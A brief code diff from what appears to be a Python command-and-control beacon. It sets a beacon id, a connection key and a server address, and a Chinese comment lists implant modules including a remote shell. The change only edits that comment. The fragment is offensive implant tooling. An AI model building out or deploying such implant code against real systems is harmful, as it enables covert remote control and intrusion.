@@ -9,7 +9,7 @@ BEACON_ID = sec.token_hex(8)
 BREAK_FLAG = False
 CONN_KEY = MASTER_KEY
 
-# ── 模块短名契约(D2): 植入端模块(set_host/set_key/relay/fork/shell)与
+# ── 模块短名契约(D2): 植入端模块(set_host/set_key/fork/shell)与
 # uplevel 升级代码(transport_base)依赖这些全局名,勿改 ──
 _D = BEACON_ID            # 当前 beacon id
 _H = HOST                 # server 地址(set_host 模块修改,connect_transport 读取)
